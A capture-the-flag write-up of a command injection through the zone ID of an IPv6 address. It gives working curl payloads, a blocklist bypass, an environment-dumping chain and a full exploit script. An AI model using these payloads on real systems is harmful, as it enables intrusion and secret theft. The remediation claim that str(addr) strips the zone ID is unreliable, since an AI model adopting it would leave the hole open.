# upCTF — 0day on ipaddress

> **Category:** Web  
> **Flag:** `upCTF{h0w_c4n_1_wr1t3_t0_4n_ip4ddress?!-H66gZvrGa38124b8}`

---

## 📖 Challenge Description

> Ever set up a server, thought everything was working, but couldn't connect?
> Find out exactly what's live and responding on your network.
> Check if your machines are reachable and see what services are running on them.
> Just please dont use it on other people's machines.

A Flask web app that takes an IP address, validates it using Python's `ipaddress` module, and runs `nmap` against it. The challenge hints at a "0day" in the `ipaddress` module itself.

---

## 🔍 Source Code Analysis

```python
@app.get("/check")
def checkIp():
    ip = request.args.get("ip")
    # ...
    try:
        ipaddress.ip_address(ip)   # <-- "validation"
    except ValueError:
        return jsonify({"error": "Invalid IP address"}), 400

    result = nmap_scan(ip, port)
```

```python
def nmap_scan(ip, port=None):
    suspicious_symbols = ["$", "\"", "\'", "\\", "@", ",", "*", "&", "|", "{", "}"]
    suspicious_commands = ["flag", "txt", "cat", "echo", "head", "tail",
                           "more", "less", "sed", "awk", "dd", "env", "printenv", "set"]

    sus = suspicious_commands + suspicious_symbols

    if any(cmd in ip.lower() for cmd in sus):
        return {"success": False, "error": "Suspicious input detected"}

    command = f"nmap -F -sV {ip}"   # <-- shell injection point
    result = subprocess.run(command, shell=True, ...)

    output = result.stdout
    if "{" in output:               # <-- output filter
        return {"success": False, "error": "Suspicious output detected"}
```

### What's protected
| Filter | Method |
|---|---|
| IP validation | `ipaddress.ip_address(ip)` |
| Keyword blocklist | `flag`, `cat`, `env`, `txt`, `printenv`... |
| Symbol blocklist | `$`, `\|`, `&`, `{`, `}`... |
| Output filter | Blocks responses containing `{` |

### What's NOT protected
- `;` (command separator) — **not in the blocklist**
- `<` `>` (redirects) — **not in the blocklist**
- `?` (glob wildcard) — **not in the blocklist**
- `/` (path separator) — only blocked by `ipaddress` validation

---

## 💡 Vulnerability 1 — Python `ipaddress` Zone ID Bypass

This is the core "0day". Python's `ipaddress.ip_address()` follows the IPv6 specification which supports **scoped addresses** using a Zone ID suffix:

```
::1%eth0   →  valid IPv6 (localhost, scoped to interface eth0)
```

Python accepts **any string** after the `%` as a zone identifier:

```python
>>> import ipaddress
>>> ipaddress.ip_address("::1%ANYTHING_HERE")
IPv6Address('::1%ANYTHING_HERE')   # ← valid!
```

This means we can inject shell commands into the zone ID portion and Python won't complain. When the value reaches `subprocess.run(..., shell=True)`, bash sees the `;` as a command separator and executes our payload.

**URL encoding note:** `%` in a URL is the percent-encoding prefix, so we write `%25` to send a literal `%` to the server:

```
URL:          ::1%25;id
Flask decodes: ::1%;id
ipaddress sees: ::1%  +  ;id   → valid IPv6 ✅
Shell runs:    nmap ... ::1%  ;  id   → RCE ✅
```

---

## 💡 Vulnerability 2 — Incomplete Filter

The developer blocked many dangerous characters and commands, but missed `;`, `<`, `>`, and `?`. These are enough to achieve full exploitation:

| Character | Purpose | Blocked? |
|---|---|---|
| `;` | Command separator | ❌ No |
| `<` | Input redirect | ❌ No |
| `>` | Output redirect | ❌ No |
| `?` | Single-char glob wildcard | ❌ No |

---

## 🚩 Exploitation — Step by Step

### Step 1: Confirm RCE

```bash
curl "http://46.225.117.62:30002/check?ip=::1%25;id"
```

```json
{
  "scan_results": "Starting SUPER CRAZY DUPER nmap scan on upCTF Framework\n\nuid=0(root) gid=0(root) groups=0(root)\n",
  "success": true
}
```

✅ Remote Code Execution confirmed as root.

---

### Step 2: Enumerate Working Directory

```bash
curl "http://46.225.117.62:30002/check?ip=::1%25;ls"
curl "http://46.225.117.62:30002/check?ip=::1%25;pwd"
```

```
/app
flag  flag.php  flag.tx  flag.txt  nmap  requirements.txt  server.py  xlag.txt
```

Interesting — many `flag*` files and a suspicious `xlag.txt`. All turned out to be **empty decoys**.

---

### Step 3: Attempt to Read Files — Hitting Constraints

Direct file reading has two problems:

| Approach | Why it fails |
|---|---|
| `cat flag` | `cat` is blocked |
| `base64 < /flag` | Space breaks `ipaddress` validation; `/` breaks it too |
| `base64<flag` | `flag` is a blocked keyword |
| `base64<f??g` | ✅ Works! — `?` glob bypasses keyword filter |

```bash
curl "http://46.225.117.62:30002/check?ip=::1%25;base64<f??g"
```

The glob `f??g` expands to `flag` on the server, but our input string never contains the literal word `flag`. All files were empty though.

---

### Step 4: Read Environment Variables (Docker Flag Storage)

In CTF Docker containers, flags are commonly stored as **environment variables**. The challenge blocks `env` and `printenv`, but not `export`.

**The trick:** Write env vars to a temp file, then base64-encode the file. This bypasses both:
- The `env`/`printenv` keyword filter (we use `export` instead)
- The `{` output filter (base64 encoding hides the `{` in `upCTF{...}`)

```bash
curl "http://46.225.117.62:30002/check?ip=::1%25;export>tmp;base64<tmp"
```

Breaking down the injected command chain:
```bash
export > tmp       # dump all env vars to file "tmp"
base64 < tmp       # read "tmp" and output as base64
```

No spaces needed, no slashes, no blocked keywords — all constraints bypassed!

---

### Step 5: Decode the Output

```bash
curl -s "http://46.225.117.62:30002/check?ip=::1%25;export>tmp;base64<tmp" | python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
raw = data['scan_results']
lines = raw.strip().split('\n')
b64 = ''.join(lines[1:])
decoded = base64.b64decode(b64 + '==').decode()
print(decoded)
"
```

**Output:**
```
export FLAG='upCTF{h0w_c4n_1_wr1t3_t0_4n_ip4ddress?!-H66gZvrGa38124b8}'
export GPG_KEY='E3FF2839C048B25C084DEBE9B26995E310250568'
export HOME='/root'
export HOSTNAME='403b62ddc7b6'
...
```

🎉 **Flag:** `upCTF{h0w_c4n_1_wr1t3_t0_4n_ip4ddress?!-H66gZvrGa38124b8}`

---

## 🗺️ Full Attack Chain

```
Attacker input:   ::1%25;export>tmp;base64<tmp
                       │
                       ▼
Flask URL decode:  ::1%;export>tmp;base64<tmp
                       │
                       ▼
ipaddress.ip_address() ──► ::1% = valid IPv6 scoped address ✅
                       │
                       ▼
Keyword filter ──► no blocked words in input ✅
                       │
                       ▼
Shell executes:    nmap -F -sV ::1%  ;  export>tmp  ;  base64<tmp
                                        └──────────────────────┘
                                         our injected commands
                       │
                       ▼
base64 output ──► { filter bypassed ✅ (flag is base64 encoded)
                       │
                       ▼
Response:          scan_results = base64(export FLAG='upCTF{...}')
                       │
                       ▼
Decode locally:    FLAG = upCTF{h0w_c4n_1_wr1t3_t0_4n_ip4ddress?!-H66gZvrGa38124b8}
```

---

## 🛠️ Final Exploit Script

```python
#!/usr/bin/env python3
import requests
import base64
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://46.225.117.62:30002"

def exploit():
    # Step 1: Verify RCE
    print("[*] Testing RCE...")
    r = requests.get(f"{TARGET}/check?ip=::1%25;id")
    print(f"    {r.json().get('scan_results', '').strip()}")

    # Step 2: Dump env vars via export, encode to bypass output filter
    print("\n[*] Dumping environment variables...")
    r = requests.get(f"{TARGET}/check?ip=::1%25;export>tmp;base64<tmp")
    data = r.json()

    raw = data["scan_results"]
    lines = raw.strip().split("\n")
    b64 = "".join(lines[1:])
    decoded = base64.b64decode(b64 + "==").decode()

    print("\n[+] Environment variables:")
    print(decoded)

    # Extract flag
    for line in decoded.split("\n"):
        if "FLAG" in line:
            print(f"\n🚩 FLAG FOUND: {line}")

if __name__ == "__main__":
    exploit()
```

---

## 🔐 Remediation

1. **Never use `shell=True`** with user-controlled input. Use a list of arguments instead:
   ```python
   # ❌ Vulnerable
   subprocess.run(f"nmap -F {ip}", shell=True)
   
   # ✅ Safe
   subprocess.run(["nmap", "-F", ip], shell=False)
   ```

2. **Don't rely on blocklists** — they always have gaps. Use allowlists (only permit known-good characters).

3. **Validate strictly after parsing** — extract only the IP portion from `ipaddress` objects:
   ```python
   addr = ipaddress.ip_address(ip)
   safe_ip = str(addr)  # strips zone ID!
   ```

4. **Don't store secrets in env vars** if avoidable, or ensure the execution environment is locked down.

---

## 📚 References

- [Python ipaddress — IPv6 scoped addresses (RFC 4007)](https://docs.python.org/3/library/ipaddress.html)
- [CWE-78 — Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
